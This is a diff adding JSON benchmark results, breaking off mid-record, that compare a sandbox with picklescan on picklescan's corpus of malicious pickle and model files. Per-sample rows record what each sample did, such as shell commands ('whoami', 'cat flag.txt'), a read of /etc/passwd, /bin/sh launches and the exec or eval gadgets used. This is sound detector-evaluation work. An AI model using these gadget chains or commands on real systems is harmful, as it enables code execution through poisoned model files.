@@ -1,0 +1,1418 @@
+{
+  "generated_at": "2026-10-08T20:08:52+0545",
+  "source": "picklescan's published test corpus (github.com/mmaitre314/picklescan)",
+  "n": 109,
+  "quarantine_observes_malicious": {
+    "n": 91,
+    "hit": 43,
+    "rate": 0.473
+  },
+  "quarantine_observes_benign": {
+    "n": 4,
+    "hit": 0,
+    "rate": 0.0
+  },
+  "picklescan_flags_malicious": {
+    "n": 91,
+    "hit": 88,
+    "rate": 0.967
+  },
+  "picklescan_flags_benign": {
+    "n": 4,
+    "hit": 0,
+    "rate": 0.0
+  },
+  "missed_by_our_box": [
+    "bad_pytorch.pt",
+    "malicious1.7z",
+    "malicious1.zip",
+    "malicious10.pkl",
+    "malicious13b.pkl",
+    "malicious14.pkl",
+    "malicious17.pkl",
+    "malicious1_0x1.zip",
+    "malicious1_0x20.zip",
+    "malicious1_0x40.zip",
+    "malicious1_central_directory.zip",
+    "malicious1_v0.pkl",
+    "malicious1_wrong_ext.zip",
+    "malicious4.pickle",
+    "malicious5.pickle",
+    "malicious6.pkl",
+    "malicious9.pkl",
+    "GHSA-3gf5-cxq9-w223.pkl",
+    "GHSA-3vg9-h568-4w9m.pkl",
+    "GHSA-4r9r-ch6f-vxmx.pkl",
+    "GHSA-4whj-rm5r-c2v8.pkl",
+    "GHSA-6vqj-c2q5-j97w.pkl",
+    "GHSA-6w4w-5w54-rjvr.pkl",
+    "GHSA-7cq8-mj8x-j263.pkl",
+    "GHSA-86cj-95qr-2p4f.pkl",
+    "GHSA-8r4j-24qv-fmq9.pkl",
+    "GHSA-9xph-j2h6-g47v.pkl",
+    "GHSA-cj3c-v495-4xqh.pkl",
+    "GHSA-f4x7-rfwp-v3xw.pkl",
+    "GHSA-f54q-57x4-jg88.pkl",
+    "GHSA-g344-hcph-8vgg.pkl",
+    "GHSA-g38g-8gr9-h9xp-pyrepl-pager.pkl",
+    "GHSA-g38g-8gr9-h9xp-test.pkl",
+    "GHSA-h3qp-7fh3-f8h4.pkl",
+    "GHSA-j343-8v2j-ff7w.pkl",
+    "GHSA-jhph-76pp-mggw.pkl",
+    "GHSA-m273-6v24-x4m4.pkl",
+    "GHSA-m869-42cg-3xwr.pkl",
+    "GHSA-p9w7-82w4-7q8m.pkl",
+    "GHSA-r8g5-cgf2-4m4m.pkl",
+    "GHSA-vr7h-p6mm-wpmh.pkl",
+    "GHSA-vv6j-3g6g-2pvj.pkl",
+    "GHSA-vvpj-8cmc-gx39.pkl",
+    "cloudpickle_codeinjection.pkl",
+    "dns_exfiltration.npy",
+    "malicious1_crc.zip",
+    "malicious22.pkl",
+    "types_CodeType.pkl"
+  ],
+  "false_positive_on_benign": [],
+  "rows": [
+    {
+      "sample": "bad_pytorch.pt",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 1,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": [
+        "bad_pytorch.pt: UnpicklingError: invalid load key, '\\x1a'."
+      ]
+    },
+    {
+      "sample": "benign0_v0.pkl",
+      "truth": "benign",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": []
+    },
+    {
+      "sample": "benign0_v3.pkl",
+      "truth": "benign",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": []
+    },
+    {
+      "sample": "benign0_v4.pkl",
+      "truth": "benign",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": []
+    },
+    {
+      "sample": "benign_password_protected.zip",
+      "truth": "benign",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "broken_model.pkl",
+      "truth": "unlabelled",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: builtins.exec"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "broken_model.pkl: UnpicklingError: pickle data was truncated"
+      ]
+    },
+    {
+      "sample": "malicious-invalid-bytes.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: os.system",
+        "os.system: b'cat flag.txt'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious0.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "file.read: /etc/passwd"
+      ],
+      "events_total": 8,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "malicious0.pkl: AttributeError: Can't get attribute 'apply' on <module 'builtins' (built-in)> (unresolved global: __builtin__.apply)"
+      ]
+    },
+    {
+      "sample": "malicious1.7z",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": null,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "malicious1.zip",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "malicious10.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "malicious10.pkl: RuntimeError: Injection running"
+      ]
+    },
+    {
+      "sample": "malicious11.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: os.system",
+        "os.system: b'cat flag.txt'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious12.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: builtins.__import__",
+        "os.system: b'echo pwned'"
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious13a.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: pickle.loads"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious13b.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 1,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious14.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "malicious14.pkl: TypeError: _run_code() missing 1 required positional argument: 'run_globals'"
+      ]
+    },
+    {
+      "sample": "malicious15a.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "os.system: b'whoami'"
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious15b.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: bdb.Bdb.run",
+        "os.system: b'whoami'"
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious16.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "socket.bind: <socket.socket fd=4, family=10, type=1, ",
+        "os.putenv: b'PIP_NO_INPUT'",
+        "os.putenv: b'PIP_EXISTS_ACTION'",
+        "file.read: /etc/os-release"
+      ],
+      "events_total": 26,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious17.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "malicious17.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch._inductor.codecache.compile_file)"
+      ]
+    },
+    {
+      "sample": "malicious18.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "file.read: 5",
+        "subprocess.Popen: /bin/sh"
+      ],
+      "events_total": 4,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious19.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: torch.serialization.load"
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "malicious19.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch.serialization.load)"
+      ]
+    },
+    {
+      "sample": "malicious1_0x1.zip",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "malicious1_0x20.zip",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "malicious1_0x40.zip",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "malicious1_central_directory.zip",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "malicious1_v0.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 1,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious1_v3.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: builtins.eval"
+      ],
+      "events_total": 1,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious1_v4.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: builtins.eval"
+      ],
+      "events_total": 1,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious1_wrong_ext.zip",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "malicious20.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "os.mkdir: /work/venv",
+        "os.mkdir: /work/venv/include",
+        "os.mkdir: /work/venv/include/python3.12",
+        "os.mkdir: /work/venv/lib"
+      ],
+      "events_total": 14,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious2_v0.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: posix.system",
+        "os.system: b'ls -la'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious2_v3.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: posix.system",
+        "os.system: b'ls -la'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious2_v4.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: posix.system",
+        "os.system: b'ls -la'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious3.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: httplib.HTTPSConnection"
+      ],
+      "events_total": 5,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious4.pickle",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "malicious4.pickle: ModuleNotFoundError: No module named 'requests' (unresolved global: requests.api.get)"
+      ]
+    },
+    {
+      "sample": "malicious5.pickle",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "malicious5.pickle: ModuleNotFoundError: No module named 'aiohttp' (unresolved global: aiohttp.client.ClientSession)"
+      ]
+    },
+    {
+      "sample": "malicious6.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious7.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: socket.create_connection",
+        "socket.getaddrinfo: github.com"
+      ],
+      "events_total": 4,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "malicious7.pkl: gaierror: [Errno -3] Temporary failure in name resolution"
+      ]
+    },
+    {
+      "sample": "malicious8.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: subprocess.run",
+        "subprocess.Popen: ls"
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious9.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "new_pytorch_model.bin",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 5,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": []
+    },
+    {
+      "sample": "not_a_pickle.bin",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 1,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": [
+        "not_a_pickle.bin: UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf8 in position 0: invalid start byte"
+      ]
+    },
+    {
+      "sample": "pytorch_magic_bypass.pt",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 1,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "pytorch_model.bin",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": []
+    },
+    {
+      "sample": "sys_module_override_sploit.pkl",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "sys_module_override_sploit.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch._utils)"
+      ]
+    },
+    {
+      "sample": "GHSA-3gf5-cxq9-w223.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-3vg9-h568-4w9m.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-3vg9-h568-4w9m.pkl: ImportError: libtk8.6.so: cannot open shared object file: No such file or directory (unresolved global: idlelib.debugobj.ObjectTreeItem.SetText)"
+      ]
+    },
+    {
+      "sample": "GHSA-4675-36f9-wf6r.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "ctypes.dlopen: None"
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-46h3-79wf-xr6c.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: builtins.__import__",
+        "os.system: b'echo \"pwned by _operator.attrgetter\"'"
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-49gj-c84q-6qm9.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: cProfile.run",
+        "os.system: b'whoami'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-4r9r-ch6f-vxmx.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-4r9r-ch6f-vxmx.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch.utils.bottleneck.__main__.run_cprofile)"
+      ]
+    },
+    {
+      "sample": "GHSA-4whj-rm5r-c2v8.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-4whj-rm5r-c2v8.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch.utils.bottleneck.__main__.run_autograd_prof)"
+      ]
+    },
+    {
+      "sample": "GHSA-5qwp-399c-mjwf.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: trace.Trace.run"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-5qwp-399c-mjwf.pkl: AttributeError: 'dict' object has no attribute 'runctx'"
+      ]
+    },
+    {
+      "sample": "GHSA-6vqj-c2q5-j97w.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-6vqj-c2q5-j97w.pkl: AttributeError: 'dict' object has no attribute 'set_cmd'"
+      ]
+    },
+    {
+      "sample": "GHSA-6w4w-5w54-rjvr.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-6w4w-5w54-rjvr.pkl: ImportError: libtk8.6.so: cannot open shared object file: No such file or directory (unresolved global: idlelib.autocomplete.AutoComplete.get_entity)"
+      ]
+    },
+    {
+      "sample": "GHSA-7cq8-mj8x-j263.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-7cq8-mj8x-j263.pkl: ImportError: libtk8.6.so: cannot open shared object file: No such file or directory (unresolved global: idlelib.autocomplete.AutoComplete.fetch_completions)"
+      ]
+    },
+    {
+      "sample": "GHSA-7wx9-6375-f5wh.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: profile.run",
+        "os.system: b'whoami'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-84r2-jw7c-4r5q.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "os.system: b'echo pwned'"
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-86cj-95qr-2p4f.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-86cj-95qr-2p4f.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch._dynamo.guards.GuardBuilder.get)"
+      ]
+    },
+    {
+      "sample": "GHSA-8r4j-24qv-fmq9.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-8r4j-24qv-fmq9.pkl: ImportError: libtk8.6.so: cannot open shared object file: No such file or directory (unresolved global: idlelib.calltip.Calltip.fetch_tip)"
+      ]
+    },
+    {
+      "sample": "GHSA-955r-x9j8-7rhh.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: builtins.__import__",
+        "os.system: b'echo \"pwned by _operator.methodcaller\""
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-9w88-8rmg-7g2p.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "os.system: b'whoami'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-9xph-j2h6-g47v.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-9xph-j2h6-g47v.pkl: ImportError: libtk8.6.so: cannot open shared object file: No such file or directory (unresolved global: idlelib.calltip.get_entity)"
+      ]
+    },
+    {
+      "sample": "GHSA-cj3c-v495-4xqh.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-cj3c-v495-4xqh.pkl: AttributeError: 'dict' object has no attribute 'showtraceback'"
+      ]
+    },
+    {
+      "sample": "GHSA-f4x7-rfwp-v3xw.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-f4x7-rfwp-v3xw.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch.fx.experimental.symbolic_shapes.ShapeEnv.evaluate_guards_expression)"
+      ]
+    },
+    {
+      "sample": "GHSA-f54q-57x4-jg88.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-f54q-57x4-jg88.pkl: AttributeError: 'dict' object has no attribute '__dict__'"
+      ]
+    },
+    {
+      "sample": "GHSA-f745-w6jp-hpxx.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: torch.utils.collect_env.run"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-f745-w6jp-hpxx.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch.utils.collect_env.run)"
+      ]
+    },
+    {
+      "sample": "GHSA-fqq6-7vqf-w3fg.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "os.system: b'whoami'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-g344-hcph-8vgg.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-g344-hcph-8vgg.pkl: AttributeError: 'dict' object has no attribute 'donothing'"
+      ]
+    },
+    {
+      "sample": "GHSA-g38g-8gr9-h9xp-aix-support.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "os.system: b\"id 2>/dev/null >'/tmp/_aix_support.1'\""
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-g38g-8gr9-h9xp-imaplib.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "file.read: 5",
+        "file.read: 6",
+        "subprocess.Popen: /bin/sh"
+      ],
+      "events_total": 9,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-g38g-8gr9-h9xp-imaplib.pkl: abort: socket error: unterminated line: b'uid=1000 gid=1000 groups=1000\\n'"
+      ]
+    },
+    {
+      "sample": "GHSA-g38g-8gr9-h9xp-osx-support.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "os.remove: /tmp/_gwbnbly",
+        "file.read: /tmp",
+        "os.system: b\"id 2>/dev/null >'/tmp/tmpi1lm9jwn'\"",
+        "os.remove: /tmp/tmpi1lm9jwn"
+      ],
+      "events_total": 5,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-g38g-8gr9-h9xp-pyrepl-pager.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-g38g-8gr9-h9xp-pyrepl-pager.pkl: ModuleNotFoundError: No module named '_pyrepl' (unresolved global: _pyrepl.pager.pipe_pager)"
+      ]
+    },
+    {
+      "sample": "GHSA-g38g-8gr9-h9xp-test.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-g38g-8gr9-h9xp-test.pkl: ModuleNotFoundError: No module named 'test' (unresolved global: test.support.script_helper.assert_python_ok)"
+      ]
+    },
+    {
+      "sample": "GHSA-g38g-8gr9-h9xp-uuid.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "file.read: 4",
+        "subprocess.Popen: /usr/bin/id"
+      ],
+      "events_total": 4,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-h3qp-7fh3-f8h4.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-h3qp-7fh3-f8h4.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch.utils.data.datapipes.utils.decoder.basichandlers)"
+      ]
+    },
+    {
+      "sample": "GHSA-j343-8v2j-ff7w.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-jgw4-cr84-mqxg.bin",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "subprocess.Popen: /bin/sh"
+      ],
+      "events_total": 8,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-jgw4-cr84-mqxg.bin: AttributeError: 'dict' object has no attribute '_proc'"
+      ]
+    },
+    {
+      "sample": "GHSA-jhph-76pp-mggw.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-jhph-76pp-mggw.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch.utils.collect_env.run_and_read_all)"
+      ]
+    },
+    {
+      "sample": "GHSA-m273-6v24-x4m4.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-m273-6v24-x4m4.pkl: ModuleNotFoundError: No module named 'distutils' (unresolved global: distutils.file_util.write_file)"
+      ]
+    },
+    {
+      "sample": "GHSA-m869-42cg-3xwr.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-m869-42cg-3xwr.pkl: ImportError: libtk8.6.so: cannot open shared object file: No such file or directory (unresolved global: idlelib.run.Executive.runcode)"
+      ]
+    },
+    {
+      "sample": "GHSA-p9w7-82w4-7q8m.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-p9w7-82w4-7q8m.pkl: AttributeError: 'dict' object has no attribute 'labels'"
+      ]
+    },
+    {
+      "sample": "GHSA-q77w-mwjj-7mqx.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
